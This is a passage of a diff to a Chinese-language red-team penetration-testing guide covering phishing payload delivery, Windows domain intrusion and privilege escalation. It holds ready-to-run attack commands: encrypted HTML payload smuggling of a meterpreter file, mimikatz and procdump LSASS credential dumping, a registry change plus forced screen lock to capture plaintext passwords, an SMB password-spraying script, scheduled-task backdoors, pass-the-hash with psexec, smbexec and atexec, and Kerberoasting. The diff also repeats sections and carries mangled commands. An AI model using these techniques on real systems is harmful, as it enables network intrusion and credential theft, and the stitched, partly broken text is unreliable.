+![在这里插入图片描述](https://img-blog.csdnimg.cn/548b1e740bed427b81fe538f57871489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+除了 0day 漏洞利用（例如 https://github.com/bhdresh/CVE-2017-0199 ）之外，Word 文档中是否还有其他任何能利用的特性呢？ 答案是肯定的。其中一个例子是 subdoc attacks。这些攻击导致受害者向网络上的攻击服务器发出 SMB 请求，以便收集 NTLM Auth Hash（NTLM 验证哈希）。 这种攻击并不是在所有场景里百分百生效，因为大多数公司现在阻止 SMB 相关端口连接外网。对于那些还未进行此种配置的公司，我们可以使用 subdoc_inector 攻击来利用这种错误配置。
+#### 隐藏的加密 payload
+作为红队队员，我们一直在寻求使用创造性的方法来构建我们的登陆页面，加密我们的 payload，并诱导用户点击运行。具有类似过程的两个不同工具是 EmbededInHTML 和 demiguise。
+
+第一个工具 [EmbededInHTM](https://github.com/Arno0x/EmbedInHTML)，该工具的描述是“ 获取文件（任何类型的文件），加密它，并将其作为资源嵌入到 HTML 文件中，还包含模拟用户点击嵌入资源之后的自动下载进程。然后，当用户浏览 HTML 文件时，嵌入式文件即时解密，保存在临时文件夹中，然后将文件展示给用户。这一系列过程会让用户感觉该文件像是从远程站点下载来的。基于用户的浏览器和显示的文件类型，浏览器可以自动打开文件。”
+
+```bash
+cd /op/EmbedInHTML
+python embedInHTML.py -k keypasshere -f meterpreter.xll -o index.html -w
+```
+![在这里插入图片描述](https://img-blog.csdnimg.cn/8a07ec8b11394556993f87988ae8da08.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+一旦受害者访问恶意站点，弹出的窗口会提示受害者在 Excel 中打开我们的.xll文件。不幸的是，对于最新版本的 Excel（除非配置错误），用户需要启用加载项来执行我们的 payload 。这就需要使用你在前面学到的社会工程学技巧了。
+
+第二个工具是 demiguise，描述是“ 生成包含一个加密的 HTA 文件的 .html 文件。该工具的思路是，当你的目标访问该页面时，将获取其密钥并在浏览器中动态解密 HTA 然后将其直接推送给用户。这是一种隐匿技术，可以绕过由某些安全设备进行的的内容/文件类型的检查。但是此工具并不是为了创建优秀的 HTA 内容而设计的。在 HTA 内容方面还有其他工具/技术可以帮助你。demiguis 希望帮助用户的是:首先让你的 HTA 进入一个环境，并且（如果你使用环境键控）避免它被沙盒化。
+
+```bash
+python demiguise.py -k hello -c “cmd.exe /c ” -p Outlook.Application -o test.hta
+```
 
 #### 钓鱼 wifi
 
-##### 鱼叉攻击
 
-“鱼叉攻击”通常是指利用木马程序作为电子邮件的附件，发送到目标电脑上，诱导受害者去打开附件来感染木马。
-附件有许多选项， 例如 Microsoft Office 文档， 可执行文件， PDF 或存档文件。 打开附件后， 攻击者的有效负载会利用漏洞或直接在用户的系统上执行。 鱼叉式网络钓鱼电子邮件的文本通常试图给出一个合理的理由，说明为什么要打开文件， 并且可以解释如何绕过系统保护以便这样做。 
 
-#### 水坑攻击
-
-在红队行动中，一般使用邮件钓鱼会携带诱饵附件，但常被邮件网关拦截，如果想要去收集更多的有效信息，可以在邮件中埋入水坑链接。而埋入的水坑的制作，对于红队来说又有些繁琐，因此本文记录一下我实现自动化这块的工作。
-
-#### 钓鱼邮件
-
-#### 钓鱼技巧
-
-**内容选择**
-
->* 实时社会新闻：10月1日国庆小长假结束后关于疫情返京统计为主旨。如果不小心或者公司有相关统计要求的情况真的很容易就中招了
->* 简历
->* 技术交流
->* 公司福利活动，请登录下载领取；
->* 软件更新
 
 
 
@@ -4091,25 +4257,6 @@ http://cnseur/frumphp
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/202105061748366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210506174808635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-**setookit**
-默认集成在了kali；
-社会工程学模块包含了很多功能，若鱼叉式网络攻击、网页攻击、邮件群发攻击、无线接入点攻击、二维码攻击等等。
-如果你使用网络攻击在复制完站点后，为达到更加真实效果，进入https://www.freenom.com/zh/index.html?lang=zh申请免费的域名。输入想要的名字默认三个月的使用时间，使用电子邮箱验证登录
-使用临时邮箱注册并接收申请域名邮件http://www.yopmail.com/zh/
-登陆阿里云，进入dns控制台添加域名，
-添加并配置好记录，然后进入云服务器管理控制台，点击实例名进入。Xshell连接服务器，开启http服务。
-[网站钓鱼攻击，图文请看这篇博客](https://www.freebuf.com/articles/web/253320.html)
-
-在set>提示符中输入1（Social-Engineering Attacks）并按下回车。
-现在选择Website Attack Vectors（选项2）。
-从下面的菜单中，我们选择Credential Harvester Attack Method（选项3）。
-选择Site Cloner（选项2）。
-它会询问IP address for the POST back in Harvester/Tabnabbing。它的意思是收集到的证书打算发送到哪个 IP。这里，我们输入 Kali 主机在vboxnet0中的 IP 192.168.56.1。
-下面，压脚询问要克隆的 URL，我们会从 vulnerable_vm 中克隆 Peruggia 的登录表单。输入http://192.168.56.102/peruggia/index. php?action=login。
-现在会开始克隆，之后你会被询问是否 SET 要开启 Apache 服务器，让我们这次选择Yes，输入y并按下回车。
-
-
-http://tool.chinaz.com/tools/dwz.aspx?qq-pf-to=pcqq.group
 
 # 经验
 ## 知名网站
@@ -4197,6 +4344,8 @@ https://www.feiliuwl.cn/go/?url=http://qb-api.com/ 或者 https://qb-api.com   �
 https://cn.linkedin.com/pub/dir?lastName=&firstName=名&trk=public_profile_people-search-bar_search-submit
 
 #### 已知邮箱
+**reg007/0xreg**。可以查看目标用户使用这个邮箱还注册了哪些网站
+针对获得的这些信息做钓鱼
 
 ##### 获取电话号码
 
@@ -4423,8 +4572,291 @@ https://tools.ipip.net/dns.php
 13. 修改host文件中的www.xxx.com和xxx.com文件，用ping确定后再访问看能否打开网页
 14. 直接在网页中访问IP地址  
 
+# 内网渗透
+## 基础
+内网也指局域网，即一个区域内多台计算机互联的计算机组。局域网可以实现共享文件、打印机等
+大多数为了安全都公司设置了公司内网。这时候如下图所示，当黑客成功越过第一道防火墙后，还有一堵墙，即进入了demilitarized zone（DMZ）。内网渗透的目的是穿过DMZ到内网。内网通常有专门管理文件的、网站服务器、个人PC机等。
 
-# 后渗透
+![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/26d3bec2b841ffece0ae7778589a52ab.png)
+从技术复杂度与功能上来说，windows比linux更适合做AD域。因此一般来说内网攻击是指的对windows系统。
+内网渗透你需要运用提权知识将你的权限提至于adminstartor，因为很多内网渗透工具是需要adminstartor权限才可以运行。域与域之间在没有建立信任关系下是不能访问的
+
+**术语**
+工作组：平级。每台计算机都是独立的，每台计算机一开始都默认分配了工作组。
+域环境： 非平级。比如机房上课老师统一控制电脑
+域控制器(DC)：类似于域管理员身份
+活动目录(AD):活动目录将所有的计算机当做像文件夹一样的访问。域控制器就是因为有了AD所以能控制别人电脑
+
+本地域组：本域成员只能访问本域。本地域组其中管理员组拥有最高权限
+全局组：本域成员可以跨域访问。类似于你拥有特权后可以访问外网。域管理组所在位置
+通用组：他域+本域成员可以跨域访问。
+**重点：流程**
+可以用lodan一键代替
+起点是获得了跳板机（域下某个用户）本地用户权限user，目标是拿下DC域下其他用户。
+当我们获得跳板机的user，先进行提权到admins权限。如果你非不想提权，在未打KB2871997补丁情况下就可以用PTH连接；已打补丁用PTK。（本文未介绍此方法，具体自行参考百度）
+信息搜集：搜集所属域下其他计算机名，ip,是否开放445/135；搜集本机adminstor明文密码，没有明文收集个hash密码也是可以的。
+建立爆破字典：自定义+常用字典，对其他计算机进行密码爆破。
+爆破成功后一组就可以进行控制上传木马等操作了。
+*补充：流程很可能还会用到免杀等技巧；如果跳板机存在MS14-068则直接利用user权限就可以获得自己提升到域管权限*
+
+**windows常见身份**
+系统默认常见用户身份：
+Domain Admains：域管理员（默认对域控制器有完全控制权）
+Domain Computers：域内机器
+Domain Controllers：域控制器
+Domain Guest：域访客，权限低
+Domain users：域用户（大多数拿到权限，首先得到的是此身份）
+Enterprise Admains：企业系统管理员用户（默认对域控有完整控制权 ）
+### 信息搜集
+信息搜集主要是搜集当前所在的AD域以及环境。
+**基本信息搜集**
+旨在了解当前服务器的计算机基本信息与权限，为后续判断服务器角色，网络环境等做准备
+systeminfo 详细信息
+net start 启动信息
+tasklist 进程列表
+schtasks 计划任务
+
+**网络信息搜集**
+旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备
+
+net time /domain 查看主域名。因为域下计算机时间都来自于AD域，所以这里就能打印得出。当然获取还有很多方式比如查看计算机属性等。
+
+netstat -ano 查看本机开放的全部端口
+nslookup 追溯域名（用这个命令追溯主域名） 追踪来源地址
+****
+**用户信息搜集**
+旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试
+whoami /all 用户权限
+net config workstation 登录信息
+net localgroup 本地用户组
+net user /domain 当前域里面的用户
+net group /doamin 获取域用户组信息
+wmic useraccount get /all 涉及域用户详细信息
+net group "Domain Admins/或写user" /domain 查询域管理员/ 用户账户
+net group "Enterprise Admins" /domain 查询管理员用户组
+net group "Domain Controllers" /domain 查询域控制器
+****
+
+**端口扫描**
+不推荐nmap原因是nmap需要安装，nmap扫描可能会留下痕迹
+```bash
+# 系统自带内部命令，不易被察觉
+for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr "TTL =" 
+```
+****
+**推荐工具**
+nishang
+采用powershell 脚本开发，系统语言所以一般不用做免杀。工具强大包含了mimikatz、扫描端口还有一系列信息搜集工具。类似于一个功能包
+还可以做扫描ip端口工具![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/b2dba5f5163f0bfdc32385b85a3be76e.png)
+
+### 获取明文密码 
+选一种可行的方案,直到你获得密码。我本机装有火绒，我发现当我实验以下工具时，基本都会被杀掉。
+**工具0：mimikatz**
+这是一种很经典的获取内网密码的方式。
+现在你可以直接打开mimikatz输入以下命令进行获取当前admin明文密码。
+
+```bash
+privilege::debug
+# 获取明文密码、NTLM
+sekurlsa::logonpasswords full
+# 获取AES值
+sekurlsa::ekeys
+```
+如果遇到上述情况失败等，你可以采用procdump+mimikatz获取密码。procdump在微软官方下载可以将密码转化为hash值
+
+```bash
+# 在敌方系统执行，将生成的lsass.dmp保存到自己电脑
+ procdump -accepteula -ma lsass.exe lsass.dmp
+# 在自己电脑上执行mimikatz上执行，以获得明文密码：
+ sekurlsa::minidump lsass.dmp
+```
+
+**工具1: 从 Windows 凭据管理器和浏览器获取密码**
+Windows 凭据管理器是 Windows 的默认功能，用于保存系统、网站和服务器的用户名、密码和证书。记不记得当你使用 Microsoft IE/EDGE 对网站进行身份验证后，通常会弹出一个弹出窗口，询问“是否要保存密码？”凭证存储就是存储这些信息的地方，在凭据管理器中，有两种类型的凭据：Web 和 Windows。你还记得哪个用户有权访问这些数据吗？它不是 system，而是登录后可以检索此信息的用户。这对我们来说是很好的，就像任何钓鱼网站或代码执行一样，我们通常都可以用别的方法获得那个用户的权限。最好的一点是，我们甚至不需要成为本地管理员来提取这些数据。
+如何提取这些信息呢？我们可以使用两种不同的 PowerShell 脚本导入以收集此数据：
+
+收集网络凭据：
+https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
+收集 Windows 凭证（只收集通用的而不是目标域特有的）
+https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1
+
+**工具2： XenArmor**
+ 强大，根据你的电脑安全性而定，有人用他获得了所有密码，而我只用它获得了我的WIFI密码
+破解链接，不知道安不安全，但是我装成功了https://www.sdbeta.com/wg/2020/0514/234852.html
+
+
+#### windows 2012
+管理的用户明文密码获取，利用工具获得明文密码前提是本身是高权限用户，如root，如AD域管理员。
+当满足：
+
+ - windows2012以下版本未安装KB2871997补丁
+ - 
+如果是windows2012以上版本默认是关闭wdigest。这时候你需要预先在注册表操作开启服务，即修改wdigest的值改为1
+
+#### windows10
+（以下参考于）
+在 Windows 10之前，以本地管理员的身份在主机系统上运行 Mimikatz 的话是允许攻击者从 lsass（本地安全机构子系统服务）中提取明文密码的。这种方法在 Windows 10 出现之前非常有效，而在 windows 10 中，即使你是本地管理员，也无法直接读取它，使用此工具获取密码是空。
+但是你可以通过如单点登录（ SSO ）或者一些特殊的软件会把密码保存在 LSASS 进程中让 Mimikatz 读取；
+最简单的选项是设置注册表项以让系统将密码凭证保存到 LSASS 进程。在 HKLM 中，有一个 UseLogonCredential 设置，如果设置为0，系统将在内存中存储凭据
+![在这里插入图片描述](https://img-blog.csdnimg.cn/3a6914a24a044057b33c35ae442fa2ce.png)
+这个注册表修改的问题就是需要用户重新登录到系统。你可以让目标机器屏幕锁屏、重新启动或注销用户，以便你能够捕获然后再次发送凭证文本。最简单的方法是锁定他们的工作机器（这样他们就不会丢失他们的当前的工作…看看我有多好！）。要触发锁屏：
+
+rundll32.exe user32.dll，LockWorkStation
+一旦我们锁定屏幕，并让它们重新登录，我们就可以重新运行 Mimikatz 来获得明文密码。
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/58fa73fde87c466dba0ac4439c4c178d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+####  Mac
+有多个渗透攻击框架的 payload 支持 Mac，我最喜欢的是使用 Empire。Empire 可以生成多个 payload 来诱骗受害者执行我们的代理，其中包括 Ducky scripts、二进制可执行程序、Office 宏、Safari 启动程序、pkg 安装包等等。
+### 横向渗透
+
+
+####  传递爆破其他账户密码
+这里主要是字典构建，即常用字典+自定义字典。
+自定义字典来自于你首先获得的用户密码，然后将这个密码以及密码格式尝试爆破别的ip密码。
+采用爆破，爆破有三个变量：密码（hash、明文）、ip、用户（信息搜集到的主机名）
+
+```bash
+import os,time
+ips={
+   '192.168.3.21',
+   '192.168.3.25',
+   '192.168.3.29',
+}
+
+users={
+   'Administrator',
+   'boss',
+   'dbadmin',
+}
+passs={
+   'admin',
+   'admin!@#45',
+   'Admin12345'
+}
+
+for ip in ips:
+   for user in users:
+       for mima in passs:
+           exec="net use \"+ "\"+ip+'\ipc$ '+mima+' /user:god\'+user
+           print('--->'+exec+'<---')
+           os.system(exec)
+           time.sleep(1)
+```
+
+编写完脚本后打包成exe
+
+#### 控制方法1：定时任务放后门
+定时不仅可以用来提权还可以用来做连接。
+这步是基于你完成上个小节获取明文密码后。经过端口扫描发现对方开放了139/445（共享文件端口、一般都是开放的）端口。因此你可以做以下操作进行存放特殊文件达到连接控制。
+**at < Windows2012**
+```bash
+net use \192.168.3.21\ipc$ "密码" /user:god.org\ad
+ministrator # 建立ipc连接：
+copy add.bat \192.168.3.21\c$  #拷贝执行文件到目标机器
+at \192.168.3.21 15:47 c:\add.bat    #添加计划任务
+```
+
+**schtasks >=Windows2012**
+
+```bash
+net use \192.168.3.32\ipc$ "admin!@#45" /user:god.org\ad
+ministrator # 建立ipc连接：
+copy add.bat \192.168.3.32\c$ #复制文件到其C盘
+schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY /tr c:\add.bat /F #创建adduser任务对应执行文件
+schtasks /run /s 192.168.3.32 /tn adduser /i #运行adduser任务
+schtasks /delete /s 192.168.3.21 /tn adduser /f#删除adduser任务
+```
+
+或者在工具不被杀毒软件干掉情况下，你可以直接用别人写好的工具，更简洁还支持hash值连接。
+atexec-impacket
+
+```bash
+atexec.exe ./administrator:Admin12345@192.168.3.21 "whoami"
+atexec.exe god/administrator:Admin12345@192.168.3.21 "whoami"
+atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 "whoami"
+```
+
+
+#### 控制方法2：建立连接
+以下连接是建立在开放了SMB协议下。
+为了省去你替工具做免杀的劳苦工作，当你获得主机的明文密码时，直接用微软官方自带工具psexec进行远程连接
+```bash
+psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd 
+```
+
+没有明文，那用第三方包smbexec
+```bash
+smbexec god/administrator:Admin12345@192.168.3.21
+smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
+```
+
+### SPN
+服务主体名称（SPN）是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。如果在整个林中的计算机上安装多个服务实例，则每个实例都必须具有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定的服务实例可以具有多个SPN。例如，SPN总是包含运行服务实例的主机名称，所以服务实例可以为其主机的每个名称或别名注册一个SPN。
+
+黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。
+**探针**
+
+```bash
+# 类似于隐蔽的nmap扫描端口结果
+setspn -q */*
+setspn -q */* | findstr "MSSQL"
+```
+
+**请求**
+
+```c
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "xxxx"
+mimikatz.exe "kerberos::ask /target:xxxx"
+```
+
+**导出**
+
+```bash
+mimikatz.exe "kerberos::list /export"
+```
+
+**破解**
+
+```bash
+python tgsrepcrack.py passwd.txt xxxx.kirbi
+python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvcSrv-DB-0day.0day.org1433-0DAY.ORG.kirbi
+```
+
+**重写**
+
+```bash
+python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500
+python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512
+mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存
+```
+
+## linux渗透
+### 信息搜集
+网络信息:
+
+netstat -anop | findstr LISTEN
+net group “Domain Admins” /domain
+流程列表:
+
+tasklist /v
+系统主机信息:
+
+sysinfo
+Get-WmiObject -class win32 operatingsystem | select -property * | exportcsv c:\temp\os.txt
+wmic qfe get Caption，Description，HotFixID，InstalledOn
+简单的文件搜索:
+
+dir /s password
+findstr /s /n /i /p foo *
+findstr /si pass .txt | .xml | *.ini
+来自共享/挂载驱动器的信息:
+
+powershell -Command “get-WmiObject -class Win32_Share”
+powershell -Command “get-PSDrive”
+powershell -Command “Get-WmiObject -Class Win32_MappedLogicalDisk | select Name， ProviderName”
+
+# 杂项
 
 
 ## 获取数据库账号密码
@@ -4455,7 +4887,8 @@ https://tools.ipip.net/dns.php
 最高权限sa,支持外联。外联可以用navicat或mssql数据库自带连接工具
 
 ### Redis
-
+redis支持网络     可基于内存、可持久化的日志类型数据库.key-value数据库
+端口号6379 
 一般是linux系统
 
 ####  PostgreSQL
@@ -4504,21 +4937,31 @@ systeminfo
 系统提权是希望从adminstator升级到system权限
 #### 提权准备
 信息搜集工具选其一，顺手即可
-**信息搜集：命令行**
+**获取exp**
 常见的公开漏洞要自己收集，具体怎么搜集后续我补充
 ```bash
 systeminfo|(for %i in (KB5003537 KB2160329 等常见的公开漏洞)do @find /i "%i">null||@echo %i bug here! )
 ```
+或者你直接对输出的systeminfo利用kali 将提取任何给定的 Windows 主机的所有补丁安装历史记录。我们可以拿回这个输出结果，将其复制到我们的 Kali 系统并运行 Windows Exploit Suggester 以查找已知的漏洞然后针对性的进行漏洞利用从而提升权限。
+回到你攻击的系统：
 
+systeminfo
+systeminfo > windows.txt
+将 windows.txt 复制到你的 Kali 虚拟机的 /opt/Windows-Exploit-Suggester 下
+python ./windows-exploit-suggester.py -i ./windows.txt -d 2018-03-21-mssb.xls
 
-**信息搜集：wes**
+![在这里插入图片描述](https://img-blog.csdnimg.cn/87574b84d19942bd99285b622de37069.png)
+
+这个工具已经有一段时间没有被维护了，但是你还是可以轻松地从中寻找到你正需要的能权限提升的漏洞。
+
+**寻找exp：wes**
 项目链接： https://github.com/bitsadmin/wesng
 这个项目执行条件轻松，只需要对方的systeminfo就可以导出疑似的漏洞了。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718231022310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 最后生成的是一个资源列表，表明了可能存在的漏洞以及公开的exp。这时候你要注意筛选，看这些漏洞是否可用是否能达到提权效果。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718231655167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-**信息搜集：windowsvulnscan**
+**寻找exp：windowsvulnscan**
 项目链接： https://github.com/chroblert/WindowsVulnScan
 主要应用在web层
 
@@ -4554,6 +4997,7 @@ Microsoft windows XP Professional SP3和之前版本
 
 执行方法，利用msf获得反弹之后在msf中执行以下命令：
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719165548297.png)
+
 
 #### 不安全的服务权限配合MSF-本地权限
 
@@ -4824,242 +5268,10 @@ PostgreSQL是一款关系型数据库。其9.3到11版本中存在一处"特性�
 连接-利用漏洞-执行-提权
 提权参考: https://vulhub.org/#/environments/postgres/
 修复方案:升级版本或打上补丁
-## 内网渗透
-大多数为了安全都公司设置了公司内网。这时候如下图所示，当黑客成功越过第一道防火墙后，还有一堵墙，即进入了demilitarized zone（DMZ）。内网渗透的目的是穿过DMZ到内网。内网通常有专门管理文件的、网站服务器、个人PC机等。
-从技术复杂度与功能上来说，windows比linux更适合做AD域。因此一般来说内网攻击是指的对windows系统。
-内网渗透你需要运用提权知识将你的权限提至于adminstartor，因为很多内网渗透工具是需要adminstartor权限才可以运行。
-![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/26d3bec2b841ffece0ae7778589a52ab.png)
-
-
-**术语**
-
-工作组：无头儿管理，计算机都是平级。比如网吧、宿舍
-域环境：有头儿（域控制器DC）管理，计算机非平级。比如机房上课老师统一控制电脑
-
-
-**重点：流程**
-可以用lodan一键代替
-起点是获得了跳板机（域下某个用户）本地用户权限user，目标是拿下DC域下其他用户。
-当我们获得跳板机的user，先进行提权到admins权限。如果你非不想提权，在未打KB2871997补丁情况下就可以用PTH连接；已打补丁用PTK。（本文未介绍此方法，具体自行参考百度）
-信息搜集：搜集所属域下其他计算机名，ip,是否开放445/135；搜集本机adminstor明文密码，没有明文收集个hash密码也是可以的。
-建立爆破字典：自定义+常用字典，对其他计算机进行密码爆破。
-爆破成功后一组就可以进行控制上传木马等操作了。
-*补充：流程很可能还会用到免杀等技巧；如果跳板机存在MS14-068则直接利用user权限就可以获得自己提升到域管权限*
-
-**windows常见身份**
-系统默认常见用户身份：
-Domain Admains：域管理员（默认对域控制器有完全控制权）
-Domain Computers：域内机器
-Domain Controllers：域控制器
-Domain Guest：域访客，权限低
-Domain users：域用户（大多数拿到权限，首先得到的是此身份）
-Enterprise Admains：企业系统管理员用户（默认对域控有完整控制权 ）
-### 信息搜集
-信息搜集主要是搜集当前所在的AD域以及环境
-**基本信息搜集**
-旨在了解当前服务器的计算机基本信息与权限，为后续判断服务器角色，网络环境等做准备
-systeminfo 详细信息
-net start 启动信息
-tasklist 进程列表
-schtasks 计划任务
-****
-
-**网络信息搜集**
-旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备
-
-net time /domain 查看主域名。因为域下计算机时间都来自于AD域，所以这里就能打印得出。当然获取还有很多方式比如查看计算机属性等。
-
-netstat -ano 查看本机开放的全部端口
-nslookup 追溯域名（用这个命令追溯主域名） 追踪来源地址
-****
-**用户信息搜集**
-旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试
-whoami /all 用户权限
-net config workstation 登录信息
-net localgroup 本地用户组
-net user /domain 当前域里面的用户
-net group /doamin 获取域用户组信息
-wmic useraccount get /all 涉及域用户详细信息
-net group "Domain Admins/或写user" /domain 查询域管理员/ 用户账户
-net group "Enterprise Admins" /domain 查询管理员用户组
-net group "Domain Controllers" /domain 查询域控制器
-****
-
-**端口扫描**
-不推荐nmap原因是nmap需要安装，nmap扫描可能会留下痕迹
-```bash
-# 系统自带内部命令，不易被察觉
-for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr "TTL =" 
-```
-****
-**推荐工具**
-nishang
-采用powershell 脚本开发，系统语言所以一般不用做免杀。工具强大包含了mimikatz、扫描端口还有一系列信息搜集工具。类似于一个功能包
-还可以做扫描ip端口工具![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/b2dba5f5163f0bfdc32385b85a3be76e.png)
-
-### 获取当前账户密码 
-管理的用户明文密码获取，利用工具获得明文密码前提是本身是高权限用户，如root，如AD域管理员。
-当满足：
-
- - windows2012以下版本未安装KB2871997补丁
- - 
-如果是windows2012以上版本默认是关闭wdigest。这时候你需要预先在注册表操作开启服务，即修改wdigest的值改为1
-
-现在你可以直接打开mimikatz输入以下命令进行获取当前admin明文密码。
-
-```bash
-privilege::debug
-# 获取明文密码、NTLM
-sekurlsa::logonpasswords full
-# 获取AES值
-sekurlsa::ekeys
-```
-如果遇到上述情况失败等，你可以采用procdump+mimikatz获取密码。procdump在微软官方下载可以将密码转化为hash值
-
-```bash
-# 在敌方系统执行，将生成的lsass.dmp保存到自己电脑
- procdump -accepteula -ma lsass.exe lsass.dmp
-# 在自己电脑上执行mimikatz上执行，以获得明文密码：
- sekurlsa::minidump lsass.dmp
-```
-
-
-**本机密码获取**
- 工具1：Lazagne
- https://github.com/AlessandroZ/LaZagne
- 不好用，密码基本找不成功，但免费
- 
-工具2： XenArmor
- 强大，只要连过的密码几乎都能找得出
-破解链接，不知道安不安全，但是我装成功了https://www.sdbeta.com/wg/2020/0514/234852.html
-
-### 横向渗透
-
-
-####  传递爆破其他账户密码
-这里主要是字典构建，即常用字典+自定义字典。
-自定义字典来自于你首先获得的用户密码，然后将这个密码以及密码格式尝试爆破别的ip密码。
-采用爆破，爆破有三个变量：密码（hash、明文）、ip、用户（信息搜集到的主机名）
-
-```bash
-import os,time
-ips={
-   '192.168.3.21',
-   '192.168.3.25',
-   '192.168.3.29',
-}
-
-users={
-   'Administrator',
-   'boss',
-   'dbadmin',
-}
-passs={
-   'admin',
-   'admin!@#45',
-   'Admin12345'
-}
-
-for ip in ips:
-   for user in users:
-       for mima in passs:
-           exec="net use \"+ "\"+ip+'\ipc$ '+mima+' /user:god\'+user
-           print('--->'+exec+'<---')
-           os.system(exec)
-           time.sleep(1)
-```
-
-编写完脚本后打包成exe
-
-#### 控制方法1：定时任务放后门
-定时不仅可以用来提权还可以用来做连接。
-这步是基于你完成上个小节获取明文密码后。经过端口扫描发现对方开放了139/445（共享文件端口、一般都是开放的）端口。因此你可以做以下操作进行存放特殊文件达到连接控制。
-**at < Windows2012**
-```bash
-net use \192.168.3.21\ipc$ "密码" /user:god.org\ad
-ministrator # 建立ipc连接：
-copy add.bat \192.168.3.21\c$  #拷贝执行文件到目标机器
-at \192.168.3.21 15:47 c:\add.bat    #添加计划任务
-```
-
-**schtasks >=Windows2012**
-
-```bash
-net use \192.168.3.32\ipc$ "admin!@#45" /user:god.org\ad
-ministrator # 建立ipc连接：
-copy add.bat \192.168.3.32\c$ #复制文件到其C盘
-schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY /tr c:\add.bat /F #创建adduser任务对应执行文件
-schtasks /run /s 192.168.3.32 /tn adduser /i #运行adduser任务
-schtasks /delete /s 192.168.3.21 /tn adduser /f#删除adduser任务
-```
-
-或者在工具不被杀毒软件干掉情况下，你可以直接用别人写好的工具，更简洁还支持hash值连接。
-atexec-impacket
-
-```bash
-atexec.exe ./administrator:Admin12345@192.168.3.21 "whoami"
-atexec.exe god/administrator:Admin12345@192.168.3.21 "whoami"
-atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 "whoami"
-```
-
-
-#### 控制方法2：建立连接
-以下连接是建立在开放了SMB协议下。
-为了省去你替工具做免杀的劳苦工作，当你获得主机的明文密码时，直接用微软官方自带工具psexec进行远程连接
-```bash
-psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd 
-```
-
-没有明文，那用第三方包smbexec
-```bash
-smbexec god/administrator:Admin12345@192.168.3.21
-smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
-```
-
-### SPN
-服务主体名称（SPN）是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。如果在整个林中的计算机上安装多个服务实例，则每个实例都必须具有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定的服务实例可以具有多个SPN。例如，SPN总是包含运行服务实例的主机名称，所以服务实例可以为其主机的每个名称或别名注册一个SPN。
-
